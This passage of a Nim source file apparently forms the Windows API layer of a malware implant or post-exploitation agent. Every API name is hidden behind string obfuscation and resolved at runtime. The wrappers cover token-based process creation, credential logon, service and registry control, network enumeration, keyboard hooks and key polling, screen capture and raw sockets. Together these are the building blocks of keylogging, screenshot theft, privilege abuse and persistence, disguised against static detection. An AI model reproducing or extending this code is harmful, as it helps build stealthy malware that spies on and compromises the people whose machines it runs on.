    hToken, app, cmd, procAttr, threadAttr, inherit, flags, env, curDir, si, pi)

proc createProcessWithTokenW*(
    hToken: pointer; logonFlags: culong; app, cmd: pointer; flags: culong;
    env, curDir, si, pi: pointer): culong =
  # Creates a process using the given token
  advfn(TCreateProcessWithTokenW, obf("CreateProcessWithTokenW"), fnCreateProcessWithTokenW)(
    hToken, logonFlags, app, cmd, flags, env, curDir, si, pi)

proc createProcessWithLogonW*(
    user, domain, password: pointer; logonFlags: culong;
    app, cmdLine: pointer; creationFlags: culong;
    env, curDir, si, pi: pointer): culong =
  # Creates a process with the given logon credentials
  advfn(TCreateProcessWithLogonW, obf("CreateProcessWithLogonW"), fnCreateProcessWithLogonW)(
    user, domain, password, logonFlags, app, cmdLine, creationFlags, env, curDir, si, pi)

proc openThreadToken*(thread: pointer; access, openAsSelf: culong; token: ptr pointer): culong =
  # Opens the token of the thread
  advfn(TOpenThreadToken, obf("OpenThreadToken"), fnOpenThreadToken)(thread, access, openAsSelf, token)

proc getCurrentThread*(): pointer =
  # Returns a handle to the current thread
  k32fn(TGetCurrentThread, obf("GetCurrentThread"), fnGetCurrentThread)()

proc openSCManagerA*(machineName, databaseName: pointer; access: culong): pointer =
  # Opens the service control manager
  advfn(TOpenSCManagerA, obf("OpenSCManagerA"), fnOpenSCManagerA)(machineName, databaseName, access)

proc openServiceA*(scManager, serviceName: pointer; access: culong): pointer =
  # Opens a service handle
  advfn(TOpenServiceA, obf("OpenServiceA"), fnOpenServiceA)(scManager, serviceName, access)

proc queryServiceStatusEx*(service: pointer; infoLevel: culong; buffer: pointer; bufSize: culong; bytesNeeded: ptr culong): culong =
  # Reads the service status
  advfn(TQueryServiceStatusEx, obf("QueryServiceStatusEx"), fnQueryServiceStatusEx)(service, infoLevel, buffer, bufSize, bytesNeeded)

proc startServiceA*(service: pointer; argc: culong; argv: pointer): culong =
  # Starts the service
  advfn(TStartServiceA, obf("StartServiceA"), fnStartServiceA)(service, argc, argv)

proc lookupPrivilegeValueW*(sys, name: pointer; luid: pointer): culong =
  # Looks up the luid of a privilege name
  advfn(TLookupPrivilegeValueW, obf("LookupPrivilegeValueW"), fnLookupPrivilegeValueW)(sys, name, luid)

proc lookupPrivilegeNameW*(sys, luid, name: pointer; len: ptr culong): culong =
  # Looks up the name of a privilege luid
  advfn(TLookupPrivilegeNameW, obf("LookupPrivilegeNameW"), fnLookupPrivilegeNameW)(sys, luid, name, len)

proc lookupAccountSidW*(
    sys, sid, name: pointer; nameLen: ptr culong; domain: pointer; domainLen: ptr culong; use: ptr culong
): culong =
  # Looks up the account name for a sid
  advfn(TLookupAccountSidW, obf("LookupAccountSidW"), fnLookupAccountSidW)(
    sys, sid, name, nameLen, domain, domainLen, use)

proc getSidSubAuthorityCount*(sid: pointer): ptr byte =
  # Returns the sub authority count of the sid
  advfn(TGetSidSubAuthorityCount, obf("GetSidSubAuthorityCount"), fnGetSidSubAuthorityCount)(sid)

proc getSidSubAuthority*(sid: pointer; idx: culong): ptr culong =
  # Returns one sub authority of the sid
  advfn(TGetSidSubAuthority, obf("GetSidSubAuthority"), fnGetSidSubAuthority)(sid, idx)

proc getSidIdentifierAuthority*(sid: pointer): pointer =
  # Returns the identifier authority of the sid
  advfn(TGetSidIdentifierAuthority, obf("GetSidIdentifierAuthority"), fnGetSidIdentifierAuthority)(sid)

proc regOpenKeyExW*(hKey: pointer; subKey: pointer; options, access: culong; resultKey: ptr pointer): culong =
  # Opens a registry key
  advfn(TRegOpenKeyExW, obf("RegOpenKeyExW"), fnRegOpenKeyExW)(hKey, subKey, options, access, resultKey)

proc regCreateKeyExW*(
  hKey: pointer; subKey: pointer; reserved: culong; klass: pointer; options, access: culong;
  sa: pointer; resultKey: ptr pointer; disposition: ptr culong
): culong =
  # Creates or opens a registry key
  advfn(TRegCreateKeyExW, obf("RegCreateKeyExW"), fnRegCreateKeyExW)(
    hKey, subKey, reserved, klass, options, access, sa, resultKey, disposition)

proc regSetValueExW*(
  hKey: pointer; valueName: pointer; reserved: culong; typ: culong; data: pointer; cbData: culong
): culong =
  # Writes a registry value
  advfn(TRegSetValueExW, obf("RegSetValueExW"), fnRegSetValueExW)(hKey, valueName, reserved, typ, data, cbData)

proc regQueryValueExW*(hKey: pointer; valueName: pointer; reserved: pointer; typ: ptr culong; data: pointer; dataSize: ptr culong): culong =
  # Reads a registry value
  advfn(TRegQueryValueExW, obf("RegQueryValueExW"), fnRegQueryValueExW)(hKey, valueName, reserved, typ, data, dataSize)

proc regDeleteValueW*(hKey: pointer; valueName: pointer): culong =
  # Deletes a registry value
  advfn(TRegDeleteValueW, obf("RegDeleteValueW"), fnRegDeleteValueW)(hKey, valueName)

proc regDeleteKeyW*(hKey: pointer; subKey: pointer): culong =
  # Deletes a registry key
  advfn(TRegDeleteKeyW, obf("RegDeleteKeyW"), fnRegDeleteKeyW)(hKey, subKey)

proc regQueryInfoKeyW*(
  hKey: pointer; klass: pointer; classLen: ptr culong; reserved: ptr culong;
  subKeys: ptr culong; maxSubKeyLen: ptr culong; maxClassLen: ptr culong;
  values: ptr culong; maxValueNameLen: ptr culong; maxValueLen: ptr culong;
  secDesc: ptr culong; lastWrite: pointer
): culong =
  # Reads information about a registry key
  advfn(TRegQueryInfoKeyW, obf("RegQueryInfoKeyW"), fnRegQueryInfoKeyW)(
    hKey, klass, classLen, reserved, subKeys, maxSubKeyLen, maxClassLen,
    values, maxValueNameLen, maxValueLen, secDesc, lastWrite)

proc regEnumKeyExW*(
  hKey: pointer; index: culong; name: pointer; nameLen: ptr culong; reserved: ptr culong;
  klass: pointer; classLen: ptr culong; lastWrite: pointer
): culong =
  # Enumerates a subkey of a registry key
  advfn(TRegEnumKeyExW, obf("RegEnumKeyExW"), fnRegEnumKeyExW)(
    hKey, index, name, nameLen, reserved, klass, classLen, lastWrite)

proc regEnumValueW*(
  hKey: pointer; index: culong; valueName: pointer; valueNameLen: ptr culong;
  reserved: ptr culong; typ: ptr culong; data: pointer; dataLen: ptr culong
): culong =
  # Enumerates a value of a registry key
  advfn(TRegEnumValueW, obf("RegEnumValueW"), fnRegEnumValueW)(
    hKey, index, valueName, valueNameLen, reserved, typ, data, dataLen)

proc regCloseKey*(hKey: pointer): culong =
  # Closes a registry key
  advfn(TRegCloseKey, obf("RegCloseKey"), fnRegCloseKey)(hKey)

proc getUserNameW*(buffer: pointer; size: ptr culong): culong =
  # Returns the current user name
  advfn(TGetUserNameW, obf("GetUserNameW"), fnGetUserNameW)(buffer, size)

proc getNamedSecurityInfoW*(
  name: pointer; objType, secInfo: culong; owner, group: ptr pointer;
  dacl, sacl: ptr pointer; sd: ptr pointer,
): culong =
  # Reads the security descriptor of a named object
  advfn(TGetNamedSecurityInfoW, obf("GetNamedSecurityInfoW"), fnGetNamedSecurityInfoW)(
    name, objType, secInfo, owner, group, dacl, sacl, sd,
  )

proc getAce*(acl: pointer; aceIndex: culong; ace: ptr pointer): culong =
  # Returns one access control entry from the list
  advfn(TGetAce, obf("GetAce"), fnGetAce)(acl, aceIndex, ace)

proc convertSidToStringSidW*(sid: pointer; str: ptr pointer): culong =
  # Converts a sid into a string
  advfn(TConvertSidToStringSidW, obf("ConvertSidToStringSidW"), fnConvertSidToStringSidW)(sid, str)

proc localFree*(hMem: pointer): pointer =
  # Frees memory allocated by the local allocator
  k32fn(TLocalFree, obf("LocalFree"), fnLocalFree)(hMem)

# ======================
# userenv
# ======================
var uenvmod: pointer

proc uenvload(api: string): pointer =
  # Loads userenv and returns the address of the named export
  if uenvmod == nil: uenvmod = loadLibraryA(obf("userenv"))
  getProcAddress(uenvmod, api)

template uenvfn(T: typedesc; name: string; cache: untyped): untyped =
  # Loads the userenv export once and returns the cached pointer
  if cache == nil: cache = cast[T](uenvload(name))
  cache

var
  fnCreateEnvironmentBlock: TCreateEnvironmentBlock
  fnDestroyEnvironmentBlock: TDestroyEnvironmentBlock
  fnLoadUserProfileW: TLoadUserProfileW
  fnUnloadUserProfile: TUnloadUserProfile

proc createEnvironmentBlock*(env: ptr pointer; token: pointer; inherit: culong): culong =
  # Builds an environment block for the token
  uenvfn(TCreateEnvironmentBlock, obf("CreateEnvironmentBlock"), fnCreateEnvironmentBlock)(
    env, token, inherit)

proc destroyEnvironmentBlock*(env: pointer): culong =
  # Frees an environment block
  uenvfn(TDestroyEnvironmentBlock, obf("DestroyEnvironmentBlock"), fnDestroyEnvironmentBlock)(env)

proc loadUserProfileW*(token, profile: pointer): culong =
  # Loads the user profile for the token
  uenvfn(TLoadUserProfileW, obf("LoadUserProfileW"), fnLoadUserProfileW)(token, profile)

proc unloadUserProfile*(token, profile: pointer): culong =
  # Unloads the user profile
  uenvfn(TUnloadUserProfile, obf("UnloadUserProfile"), fnUnloadUserProfile)(token, profile)

# ======================
# iphlpapi
# ======================
var ipmod: pointer

proc ipload(api: string): pointer =
  # Loads iphlpapi and returns the address of the named export
  if ipmod == nil: ipmod = loadLibraryA(obf("iphlpapi"))
  getProcAddress(ipmod, api)

template ipfn(T: typedesc; name: string; cache: untyped): untyped =
  # Loads the iphlpapi export once and returns the cached pointer
  if cache == nil: cache = cast[T](ipload(name))
  cache

var
  fnGetAdaptersAddresses: TGetAdaptersAddresses
  fnGetAdaptersInfo: TGetAdaptersInfo
  fnGetIpForwardTable: TGetIpForwardTable
  fnGetIpNetTable: TGetIpNetTable
  fnGetExtendedTcpTable: TGetExtendedTcpTable
  fnGetExtendedUdpTable: TGetExtendedUdpTable

proc getAdaptersAddresses*(family, flags: culong; reserved, adapterAddresses: pointer; sizePointer: ptr culong): culong =
  # Reads the adapter addresses
  ipfn(TGetAdaptersAddresses, obf("GetAdaptersAddresses"), fnGetAdaptersAddresses)(family, flags, reserved, adapterAddresses, sizePointer)

proc getAdaptersInfo*(adapterInfo: pointer; outBufLen: ptr culong): culong =
  # Reads the adapter information
  ipfn(TGetAdaptersInfo, obf("GetAdaptersInfo"), fnGetAdaptersInfo)(adapterInfo, outBufLen)

proc getIpForwardTable*(table: pointer; size: ptr culong; order: culong): culong =
  # Reads the ip forward table
  ipfn(TGetIpForwardTable, obf("GetIpForwardTable"), fnGetIpForwardTable)(table, size, order)

proc getIpNetTable*(table: pointer; size: ptr culong; order: culong): culong =
  # Reads the ip neighbor table
  ipfn(TGetIpNetTable, obf("GetIpNetTable"), fnGetIpNetTable)(table, size, order)

proc getExtendedTcpTable*(table: pointer; size: ptr culong; order, af, tableClass, reserved: culong): culong =
  # Reads the tcp connection table
  ipfn(TGetExtendedTcpTable, obf("GetExtendedTcpTable"), fnGetExtendedTcpTable)(table, size, order, af, tableClass, reserved)

proc getExtendedUdpTable*(table: pointer; size: ptr culong; order, af, tableClass, reserved: culong): culong =
  # Reads the udp listener table
  ipfn(TGetExtendedUdpTable, obf("GetExtendedUdpTable"), fnGetExtendedUdpTable)(table, size, order, af, tableClass, reserved)

proc getDriveTypeW*(root: pointer): culong =
  # Returns the type of the drive
  k32fn(TGetDriveTypeW, obf("GetDriveTypeW"), fnGetDriveTypeW)(root)

# ======================
# user32
# ======================
var u32mod: pointer

proc u32load(api: string): pointer =
  # Loads user32 and returns the address of the named export
  if u32mod == nil: u32mod = loadLibraryA(obf("user32.dll"))
  if u32mod == nil: return nil
  getProcAddress(u32mod, api)

template u32fn(T: typedesc; name: string; cache: untyped): untyped =
  # Loads the user32 export once and returns the cached pointer
  if cache == nil: cache = cast[T](u32load(name))
  cache

var
  fnGetDC: TGetDC
  fnReleaseDC: TReleaseDC
  fnGetAsyncKeyState: TGetAsyncKeyState
  fnSetWindowsHookExW: TSetWindowsHookExW
  fnUnhookWindowsHookEx: TUnhookWindowsHookEx
  fnCallNextHookEx: TCallNextHookEx
  fnGetMessageW: TGetMessageW
  fnPeekMessageW: TPeekMessageW
  fnDispatchMessageW: TDispatchMessageW
  fnPostThreadMessageW: TPostThreadMessageW

proc getDC*(hwnd: pointer): pointer =
  # Returns a device context for the window
  u32fn(TGetDC, obf("GetDC"), fnGetDC)(hwnd)

proc releaseDC*(hwnd, hdc: pointer): culong =
  # Releases the device context
  u32fn(TReleaseDC, obf("ReleaseDC"), fnReleaseDC)(hwnd, hdc)

proc getAsyncKeyState*(vk: int32): int16 =
  # Returns the current state of the key
  u32fn(TGetAsyncKeyState, obf("GetAsyncKeyState"), fnGetAsyncKeyState)(vk)

proc setWindowsHookExW*(idHook: int32; lpfn: pointer; hmod: pointer; dwThreadId: culong): pointer =
  # Installs a windows hook
  u32fn(TSetWindowsHookExW, obf("SetWindowsHookExW"), fnSetWindowsHookExW)(
    idHook, lpfn, hmod, dwThreadId)

proc unhookWindowsHookEx*(hhk: pointer): culong =
  # Removes a windows hook
  u32fn(TUnhookWindowsHookEx, obf("UnhookWindowsHookEx"), fnUnhookWindowsHookEx)(hhk)

proc callNextHookEx*(hhk: pointer; nCode: int32; wParam: culong; lParam: pointer): culong =
  # Passes the hook event to the next handler
  u32fn(TCallNextHookEx, obf("CallNextHookEx"), fnCallNextHookEx)(
    hhk, nCode, wParam, lParam)

proc getMessageW*(lpMsg: pointer; hWnd: pointer; wMsgFilterMin, wMsgFilterMax: culong): int32 =
  # Reads the next message from the thread queue
  u32fn(TGetMessageW, obf("GetMessageW"), fnGetMessageW)(
    lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax)

proc peekMessageW*(lpMsg: pointer; hWnd: pointer; wMsgFilterMin, wMsgFilterMax, wRemoveMsg: culong): culong =
  # Peeks at a message in the thread queue
  u32fn(TPeekMessageW, obf("PeekMessageW"), fnPeekMessageW)(
    lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax, wRemoveMsg)

proc dispatchMessageW*(lpMsg: pointer): culong =
  # Dispatches a message to the window procedure
  u32fn(TDispatchMessageW, obf("DispatchMessageW"), fnDispatchMessageW)(lpMsg)

proc postThreadMessageW*(idThread: culong; msg: culong; wParam, lParam: culong): culong =
  # Posts a message to a thread queue
  u32fn(TPostThreadMessageW, obf("PostThreadMessageW"), fnPostThreadMessageW)(
    idThread, msg, wParam, lParam)

# ======================
# gdi32
# ======================
var gdimod: pointer

proc gdiload(api: string): pointer =
  # Loads gdi32 and returns the address of the named export
  if gdimod == nil: gdimod = loadLibraryA(obf("gdi32.dll"))
  if gdimod == nil: return nil
  getProcAddress(gdimod, api)

template gdifn(T: typedesc; name: string; cache: untyped): untyped =
  # Loads the gdi32 export once and returns the cached pointer
  if cache == nil: cache = cast[T](gdiload(name))
  cache

var
  fnGetDeviceCaps: TGetDeviceCaps
  fnCreateCompatibleDC: TCreateCompatibleDC
  fnCreateCompatibleBitmap: TCreateCompatibleBitmap
  fnSelectObject: TSelectObject
  fnBitBlt: TBitBlt
  fnStretchBlt: TStretchBlt
  fnGetDIBits: TGetDIBits
  fnCreateDIBSection: TCreateDIBSection
  fnDeleteObject: TDeleteObject
  fnDeleteDC: TDeleteDC

proc getDeviceCaps*(hdc: pointer; idx: int32): int32 =
  # Returns a capability value from the device context
  gdifn(TGetDeviceCaps, obf("GetDeviceCaps"), fnGetDeviceCaps)(hdc, idx)

proc createCompatibleDC*(hdc: pointer): pointer =
  # Creates a memory device context
  gdifn(TCreateCompatibleDC, obf("CreateCompatibleDC"), fnCreateCompatibleDC)(hdc)

proc createCompatibleBitmap*(hdc: pointer; w, h: int32): pointer =
  # Creates a bitmap compatible with the device context
  gdifn(TCreateCompatibleBitmap, obf("CreateCompatibleBitmap"), fnCreateCompatibleBitmap)(hdc, w, h)

proc selectObject*(hdc, obj: pointer): pointer =
  # Selects an object into the device context
  gdifn(TSelectObject, obf("SelectObject"), fnSelectObject)(hdc, obj)

proc bitBlt*(dest: pointer; dx, dy, w, h: int32; src: pointer; sx, sy: int32; rop: culong): culong =
  # Copies a rectangle of pixels between device contexts
  gdifn(TBitBlt, obf("BitBlt"), fnBitBlt)(dest, dx, dy, w, h, src, sx, sy, rop)

proc stretchBlt*(dest: pointer; dx, dy, dw, dh: int32; src: pointer; sx, sy, sw, sh: int32; rop: culong): culong =
  # Copies and scales a rectangle of pixels
  gdifn(TStretchBlt, obf("StretchBlt"), fnStretchBlt)(dest, dx, dy, dw, dh, src, sx, sy, sw, sh, rop)

proc getDIBits*(hdc, bmp: pointer; start, lines: culong; bits: pointer; bmi: ptr BitmapInfo; usage: culong): int32 =
  # Copies bitmap bits into the buffer
  gdifn(TGetDIBits, obf("GetDIBits"), fnGetDIBits)(hdc, bmp, start, lines, bits, cast[pointer](bmi), usage)

proc createDIBSection*(
  hdc: pointer; bmi: ptr BitmapInfo; usage: culong; bits: ptr pointer; section: pointer; offset: culong
): pointer =
  # Creates a device independent bitmap section
  gdifn(TCreateDIBSection, obf("CreateDIBSection"), fnCreateDIBSection)(
    hdc, cast[pointer](bmi), usage, bits, section, offset)

proc deleteObject*(h: pointer): culong =
  # Deletes a gdi object
  gdifn(TDeleteObject, obf("DeleteObject"), fnDeleteObject)(h)

proc deleteDC*(hdc: pointer): culong =
  # Deletes a device context
  gdifn(TDeleteDC, obf("DeleteDC"), fnDeleteDC)(hdc)

# ======================
# ws2_32
# ======================
var ws2mod: pointer

proc ws2load(api: string): pointer =
  # Loads the winsock library and returns the address of the named export
  if ws2mod == nil:
    ws2mod = loadLibraryA(obf("ws2_32"))
  getProcAddress(ws2mod, api)

template ws2fn(T: typedesc; name: string; cache: untyped): untyped =
  # Loads the winsock export once and returns the cached pointer
  if cache == nil:
    cache = cast[T](ws2load(name))
  cache

var
  fnWsaStartup: TWsaStartup
  fnWsaCleanup: TWsaCleanup
  fnWs2Socket: TWs2Socket
  fnWs2Connect: TWs2Connect
  fnWs2CloseSocket: TWs2CloseSocket
  fnWs2Select: TWs2Select
  fnWs2IoctlSocket: TWs2IoctlSocket
  fnWs2SendTo: TWs2SendTo
  fnWsaGetLastError: TWsaGetLastError
  fnInetAddr: TInetAddr
  fnHtons: THtons
  fnGetHostByName: TGetHostByName
  fnWs2GetSockOpt: TWs2GetSockOpt

proc wsaStartup*(wVersionRequested: uint16; lpWSAData: pointer): int32 =
  # Starts the winsock library
  ws2fn(TWsaStartup, obf("WSAStartup"), fnWsaStartup)(wVersionRequested, lpWSAData)

proc wsaCleanup*(): int32 =
  # Shuts down the winsock library
  ws2fn(TWsaCleanup, obf("WSACleanup"), fnWsaCleanup)()

proc ws2Socket*(af, typ, protocol: int32): SocketHandle =
  # Creates a socket
  ws2fn(TWs2Socket, obf("socket"), fnWs2Socket)(af, typ, protocol)

proc ws2Connect*(s: SocketHandle; name: pointer; namelen: int32): int32 =
  # Connects the socket to an address
  ws2fn(TWs2Connect, obf("connect"), fnWs2Connect)(s, name, namelen)

proc ws2CloseSocket*(s: SocketHandle): int32 =
  # Closes the socket
  ws2fn(TWs2CloseSocket, obf("closesocket"), fnWs2CloseSocket)(s)

proc ws2Select*(nfds: int32; readfds, writefds, exceptfds: pointer; timeout: pointer): int32 =
  # Waits until a socket is ready
  ws2fn(TWs2Select, obf("select"), fnWs2Select)(nfds, readfds, writefds, exceptfds, timeout)

proc ws2IoctlSocket*(s: SocketHandle; cmd: int32; argp: pointer): int32 =
  # Sets a socket control option
  ws2fn(TWs2IoctlSocket, obf("ioctlsocket"), fnWs2IoctlSocket)(s, cmd, argp)

proc ws2SendTo*(s: SocketHandle; buf: pointer; len, flags: int32; to: pointer; tolen: int32): int32 =
  # Sends a datagram to an address
  ws2fn(TWs2SendTo, obf("sendto"), fnWs2SendTo)(s, buf, len, flags, to, tolen)

proc wsaGetLastError*(): int32 =
  # Returns the last winsock error
  ws2fn(TWsaGetLastError, obf("WSAGetLastError"), fnWsaGetLastError)()

proc inetAddr*(cp: cstring): uint32 =
  # Converts a dotted address string into a number
  ws2fn(TInetAddr, obf("inet_addr"), fnInetAddr)(cp)

proc htons*(hostshort: uint16): uint16 =
  # Converts a short from host order to network order
  ws2fn(THtons, obf("htons"), fnHtons)(hostshort)

proc getHostByName*(name: cstring): pointer =
  # Resolves a host name to addresses
  ws2fn(TGetHostByName, obf("gethostbyname"), fnGetHostByName)(name)

proc ws2GetSockOpt*(s: SocketHandle; level, optname: int32; optval: pointer; optlen: pointer): int32 =
  # Reads a socket option
  ws2fn(TWs2GetSockOpt, obf("getsockopt"), fnWs2GetSockOpt)(s, level, optname, optval, optlen)
